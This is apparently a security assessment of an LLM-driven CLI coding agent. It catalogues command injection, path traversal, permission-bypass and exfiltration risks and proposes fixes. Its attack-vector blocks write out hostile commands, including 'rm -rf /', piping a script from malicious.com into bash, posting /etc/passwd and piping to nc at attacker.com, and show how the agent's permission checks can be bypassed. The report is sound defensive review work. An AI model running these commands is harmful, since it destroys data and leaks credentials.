# Autohand CLI Agent - Security Assessment Report

## Executive Summary

This report identifies critical security vulnerabilities in the Autohand CLI agent that could lead to system compromise, data exfiltration, and unauthorized access. The agent's design trusts LLM output without sufficient validation, creating multiple attack vectors.

**Risk Level:** 🔴 **HIGH** - Production use is not recommended without addressing critical issues.

---

## Critical Security Issues

### 1. Command Injection in `run_command` Tool

**Severity:** 🔴 **CRITICAL**  
**Location:** `src/actions/command.ts` (referenced via `src/core/actionExecutor.ts`)

**Description:**  
The `run_command` tool accepts arbitrary shell commands and arguments directly from LLM output without proper sanitization or validation. While a permission system exists, it can be bypassed.

**Attack Vectors:**
```bash
# System destruction
rm -rf /

# Remote code execution
curl http://malicious.com/exploit.sh | bash

# Privilege escalation
sudo whoami

# Data exfiltration
curl -X POST -d @/etc/passwd http://attacker.com/leak
```

**Evidence:**
```typescript
// src/core/actionExecutor.ts:350-360
const result = await runCommand(
  action.command,      // Direct from LLM
  action.args ?? [],   // Direct from LLM
  this.runtime.workspaceRoot,
  {
    directory: action.directory,
    background: action.background,
    onStdout: (chunk) => emitOutput('stdout', chunk),
    onStderr: (chunk) => emitOutput('stderr', chunk),
  }
);
```

**Impact:** Complete system compromise, data loss, unauthorized access

---

### 2. Path Traversal Vulnerability

**Severity:** 🔴 **CRITICAL**  
**Location:** `src/actions/filesystem.ts` - `resolvePath()` method

**Description:**  
The workspace boundary check can be bypassed using symlinks, path traversal sequences, and OS-specific edge cases.

**Attack Vectors:**
```bash
# Symlink attack
ln -s /etc/passwd workspace/exploit
# Agent reads/writes outside workspace

# Path traversal before normalization
../etc/passwd

# Windows-specific paths
C:\Windows\System32\config\SAM
```

**Vulnerable Code:**
```typescript
// src/actions/filesystem.ts:140-150
private resolvePath(target: string): string {
  const normalized = path.isAbsolute(target) ? target : path.join(this.workspaceRoot, target);
  const resolved = path.resolve(normalized);
  const rootWithSep = this.workspaceRoot.endsWith(path.sep)
    ? this.workspaceRoot
    : `${this.workspaceRoot}${path.sep}`;
  if (resolved !== this.workspaceRoot && !resolved.startsWith(rootWithSep)) {
    throw new Error(`Path ${target} escapes the workspace root ${this.workspaceRoot}`);
  }
  return resolved;
}
```

**Issues:**
- No symlink resolution before validation
- Race conditions possible
- OS-specific path handling inconsistencies

**Impact:** Unauthorized file access, configuration tampering, secret theft

---

### 3. Arbitrary File Write/Overwrite

**Severity:** 🔴 **CRITICAL**  
**Location:** `src/core/actionExecutor.ts` - `write_file` and `apply_patch` cases

**Description:**  
The LLM can write or modify any file within the workspace, including critical configuration files, git credentials, and environment files.

**Attack Vectors:**
```bash
# Overwrite git config
write_file: { path: ".git/config", contents: "[remote \"origin\"]\nurl = http://attacker.com/repo.git" }

# Create malicious .env
write_file: { path: ".env", contents: "AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE" }

# Modify package.json scripts
apply_patch: { path: "package.json", patch: "..." }
```

**Evidence:**
```typescript
// src/core/actionExecutor.ts:140-165
case 'write_file': {
  // ... permission check
  await this.files.writeFile(action.path, newContent);
  this.onFileModified?.();
  return exists ? `Updated ${action.path}` : `Created ${action.path}`;
}
```

**Impact:** Supply chain attacks, credential leakage, build process compromise

---

### 4. Meta-Tool Command Injection

**Severity:** 🔴 **CRITICAL**  
**Location:** `src/core/actionExecutor.ts` - `executeMetaTool()` method

**Description:**  
Meta-tools use template substitution for shell commands but don't comprehensively sanitize special characters that could lead to command injection.

**Vulnerable Code:**
```typescript
// src/core/actionExecutor.ts:700-720
private async executeMetaTool(metaTool, args: Record<string, unknown>): Promise<string> {
  let command = metaTool.handler;
  
  // Extract all {{param}} placeholders
  const placeholderRegex = /\{\{(\w+)\}\}/g;
  let match: RegExpExecArray | null;
  
  while ((match = placeholderRegex.exec(metaTool.handler)) !== null) {
    const paramName = match[1];
    const value = args[paramName];
    
    // Escape shell special characters
    const escapedValue = String(value).replace(/(["`$\\])/g, '\\$1');
    command = command.replace(new RegExp(`\\{\\{${paramName}\\}\\}`, 'g'), escapedValue);
  }
  
  // Execute via shell
  const result = await runCommand(command, [], this.runtime.workspaceRoot);
  // ...
}
```

**Bypass Examples:**
```bash
# Despite escaping, these can still work:
param: "test; rm -rf /"
param: "test && malicious_command"
param: "test | nc attacker.com 1337"
param: "test$(whoami)"
```

**Impact:** Same as command injection - full system compromise

---

### 5. Image Processing Vulnerabilities

**Severity:** 🟡 **HIGH**  
**Location:** `src/ui/inputPrompt.ts`, `src/modes/rpc/adapter.ts`

**Description:**  
Image processing lacks proper validation, enabling DoS attacks and potential exploitation of image parsing vulnerabilities.

**Issues:**
- No validation of actual image content vs. claimed MIME type
- Large images can cause memory exhaustion
- No validation of image dimensions before processing
- Potential for exploiting image parser vulnerabilities

**Evidence:**
```typescript
// src/modes/rpc/adapter.ts:100-120
const data = Buffer.from(img.data, 'base64');
if (data.length > MAX_IMAGE_SIZE) {
  writeNotification(RPC_NOTIFICATIONS.ERROR, {
    code: -32602,
    message: `Image too large: ${Math.round(data.length / 1024 / 1024)}MB`,
    recoverable: true,
    timestamp: createTimestamp(),
  });
  continue;
}
```

**Attack Vectors:**
- Crafted images with compression bombs
- Images with malicious metadata
- Base64 spoofing to bypass size checks

**Impact:** DoS, potential RCE through image parser exploits

---

### 6. Insecure Permission System Defaults

**Severity:** 🟡 **HIGH**  
**Location:** `src/permissions/PermissionManager.ts`

**Description:**  
The permission system has dangerous defaults and can be overridden by CLI flags, potentially disabling all security controls.

**Vulnerable Code:**
```typescript
// src/permissions/PermissionManager.ts:30-45
constructor(options: PermissionManagerOptions | PermissionSettings = {}) {
  const isOptions = 'settings' in options || 'onPersist' in options || 'workspaceRoot' in options;
  const settings = isOptions ? (options as PermissionManagerOptions).settings ?? {} : options as PermissionSettings;
  
  this.settings = {
    mode: 'interactive',  // Can be overridden by --unrestricted
    whitelist: [],
    blacklist: [],
    rules: [],
    rememberSession: true,
    ...settings
  };
  this.mode = this.settings.mode || 'interactive';
}
```

**CLI Override Risk:**
```bash
autohand --unrestricted --prompt "delete everything"
# Bypasses all permission checks
```

**Impact:** Complete bypass of security controls

---

### 7. Custom Command Persistence Without Validation

**Severity:** 🟡 **HIGH**  
**Location:** `src/core/customCommands.ts` (referenced)

**Description:**  
Custom commands saved to `~/.autohand/commands/` are executed without re-validation, allowing persistent malicious commands.

**Evidence:**
```typescript
// src/core/actionExecutor.ts:650-670
private async executeCustomCommand(action): Promise<string> {
  const existing = await loadCustomCommand(action.name);
  const definition = existing ?? { ... };
  
  if (!existing) {
    // Only ask for confirmation on first save
    const answer = await this.confirmDangerousAction('Add and run this custom command?');
    if (!answer) return 'Custom command rejected by user.';
    await saveCustomCommand(definition);
  }
  
  // No confirmation on subsequent executions
  const result = await runCommand(definition.command, definition.args ?? [], this.runtime.workspaceRoot);
  // ...
}
```

**Attack Flow:**
1. First execution: User approves "harmless" command
2. Command saved to `~/.autohand/commands/malicious.json`
3. Subsequent executions: No validation, command persists across sessions

**Impact:** Persistent backdoor, supply chain attack

---

### 8. Tool Registry Information Disclosure

**Severity:** 🟡 **MEDIUM**  
**Location:** `src/core/toolManager.ts`

**Description:**  
The `tools_registry` tool exposes all available tools, including potentially dangerous ones, without filtering based on context or security level.

**Evidence:**
```typescript
// src/core/actionExecutor.ts:120-123
case 'tools_registry': {
  const tools = await this.toolsRegistry.listTools(this.getRegisteredTools());
  return JSON.stringify(tools, null, 2);
}
```

**Impact:** Information disclosure that could aid in crafting targeted attacks

---

## Medium Severity Issues

### 9. Environment Variable Exposure

**Severity:** 🟡 **MEDIUM**

**Description:**  
The agent has access to environment variables and can leak them through various tools.

**Attack Vectors:**
```bash
# Read .env files
read_file: { path: ".env" }

# Execute env commands
run_command: { command: "env" }

# Print environment
run_command: { command: "printenv" }
```

**Impact:** Credential leakage, API key exposure

---

### 10. Network Request Forgery

**Severity:** 🟡 **MEDIUM**

**Description:**  
`web_search` and `fetch_url` tools can make arbitrary HTTP requests, potentially:
- Triggering actions on internal services
- Exfiltrating data via DNS/HTTP callbacks
- Scanning internal networks

**Evidence:**
```typescript
// src/core/actionExecutor.ts:750-765
case 'web_search': {
  const results = await webSearch(action.query, {
    maxResults: action.max_results,
    searchType: action.search_type
  });
  // ...
}

case 'fetch_url': {
  const content = await fetchUrl(action.url, {
    maxLength: action.max_length
  });
  // ...
}
```

**Impact:** SSRF, data exfiltration, internal network reconnaissance

---

### 11. Resource Exhaustion

**Severity:** 🟡 **MEDIUM**

**Description:**  
No limits on:
- File sizes for read/write operations
- Search result counts
- Background process spawning
- Image processing memory usage

**Impact:** DoS, system instability

---

### 12. Git Operations Without Validation

**Severity:** 🟡 **MEDIUM**

**Description:**  
Git operations can overwrite remote branches, create conflicts, and leak repository contents.

**Attack Vectors:**
```bash
# Force push to overwrite history
git_push: { remote: "origin", branch: "main", force: true }

# Merge malicious branches
git_merge: { branch: "attacker-branch" }

# Rebase onto compromised base
git_rebase: { upstream: "attacker-branch" }
```

**Impact:** Repository compromise, code injection, history rewriting

---

## Additional Concerns

### 13. Lack of Audit Logging
- No comprehensive logging of tool executions
- No forensic trail for security incidents
- Difficult to trace malicious activities

### 14. No Rate Limiting
- Unlimited tool executions per session
- No cooldown periods for dangerous operations
- Potential for automated attack scripts

### 15. Insecure Dependencies
- Heavy reliance on external packages (npm ecosystem)
- No dependency vulnerability scanning mentioned
- Supply chain attack surface

---

## Recommended Mitigations

### Immediate Actions (Critical)

1. **Implement Strict Command Allowlisting**
   ```typescript
   const SAFE_COMMANDS = ['git', 'npm', 'yarn', 'node', 'ls', 'cat', 'grep'];
   const ALLOWED_PATTERNS = [/^git status$/, /^npm test$/];
   
   if (!SAFE_COMMANDS.includes(command) || !ALLOWED_PATTERNS.some(p => p.test(fullCommand))) {
     throw new Error('Command not allowed');
   }
   ```

2. **Enhanced Path Validation**
   ```typescript
   private resolvePathSecure(target: string): string {
     const resolved = path.resolve(this.workspaceRoot, target);
     
     // Resolve symlinks
     const realPath = fs.realpathSync(resolved);
     
     // Check workspace boundary
     if (!realPath.startsWith(this.workspaceRoot + path.sep)) {
       throw new Error('Path traversal detected');
     }
     
     return realPath;
   }
   ```

3. **Require Confirmation for All Destructive Operations**
   - No bypass via CLI flags
   - Multi-factor confirmation for high-risk operations
   - Time-limited approval tokens

4. **Implement Comprehensive Input Validation**
   ```typescript
   const schema = {
     command: Joi.string().pattern(/^[a-zA-Z0-9\s\-_\/\.]+$/),
     args: Joi.array().items(Joi.string().pattern(/^[a-zA-Z0-9\s\-_\.]+$/)),
     path: Joi.string().pattern(/^[a-zA-Z0-9_\-\.\/]+$/)
   };
   ```

### Short-term (1-2 weeks)

5. **Add Audit Logging**
   ```typescript
   interface AuditLog {
     timestamp: string;
     user: string;
     tool: string;
     action: string;
     success: boolean;
     riskLevel: 'low' | 'medium' | 'high' | 'critical';
   }
   ```

6. **Sandbox `run_command`**
   - Use Docker containers for command execution
   - Implement restricted shell (rbash)
   - Use Node.js `child_process` with restricted environment

7. **Rate Limiting**
   ```typescript
   const RATE_LIMITS = {
     run_command: { max: 5, window: 60000 },  // 5 per minute
     write_file: { max: 10, window: 60000 },
     delete_path: { max: 3, window: 60000 }
   };
   ```

8. **Content-Type Validation for Images**
   ```typescript
   const fileType = await import('file-type');
   const type = await fileType.fromBuffer(data);
   if (!type || !['image/png', 'image/jpeg', 'image/gif'].includes(type.mime)) {
     throw new Error('Invalid image type');
   }
   ```

### Long-term (1-3 months)

9. **Capability-Based Security**
   ```typescript
   interface Capability {
     name: string;
     description: string;
     requiredFor: string[];
   }
   
   // Tools require explicit capabilities
   const capabilities = {
     file_read: ['read_file', 'search'],
     file_write: ['write_file', 'apply_patch'],
     network: ['web_search', 'fetch_url'],
     system: ['run_command']
   };
   ```

10. **Security Scanning Integration**
    - Scan all file writes for secrets (gitleaks, truffleHog)
    - Malware detection for downloaded files
    - Dependency vulnerability scanning

11. **Cryptographic Signing for Custom Commands**
    ```typescript
    const crypto = require('crypto');
    
    function signCommand(command, privateKey) {
      const hash = crypto.createHash('sha256').update(JSON.stringify(command)).digest('hex');
      return crypto.sign(null, Buffer.from(hash), privateKey);
    }
    ```

12. **Proper Sandboxing**
    - Run agent in Docker container
    - Use gVisor or Firecracker for isolation
    - Implement seccomp profiles
    - Use AppArmor/SELinux policies

---

## Security Testing Checklist

Before deploying, verify:

- [ ] All `run_command` calls use allowlisted commands only
- [ ] Path traversal attempts are blocked
- [ ] Symlinks outside workspace are rejected
- [ ] File size limits enforced on all read/write operations
- [ ] Image processing validates actual content, not just MIME type
- [ ] Permission system cannot be bypassed via CLI flags
- [ ] Custom commands require re-approval on each session
- [ ] All destructive operations require explicit confirmation
- [ ] Audit logs capture all tool executions
- [ ] Rate limiting prevents resource exhaustion
- [ ] Network requests are restricted to approved domains
- [ ] Environment variables cannot be leaked
- [ ] Git operations are validated before execution
- [ ] No sensitive data in error messages
- [ ] All inputs are validated with strict schemas

---

## Conclusion

The Autohand CLI agent has **significant security vulnerabilities** that make it unsuitable for production use with untrusted inputs or in sensitive environments. The core issue is excessive trust in LLM output without comprehensive validation and sandboxing.

**Priority Actions:**
1. ✅ Implement strict command allowlisting (Day 1)
2. ✅ Fix path traversal vulnerabilities (Day 1)
3. ✅ Require confirmation for all destructive operations (Day 1)
4. ✅ Add comprehensive input validation (Day 2-3)
5. ✅ Implement audit logging (Week 1)

**Risk Acceptance:** If immediate fixes are not possible, consider:
- Running only in isolated VMs/containers
- Restricting to read-only operations
- Using only in development environments
- Implementing human-in-the-loop for all operations

---

**Report Generated:** 2024  
**Assessment Type:** Security Code Review  
**Scope:** Autohand CLI Agent v1.0  
**Files Reviewed:** 6 core files, 12+ supporting modules

*This report should be reviewed by security team before production deployment.*
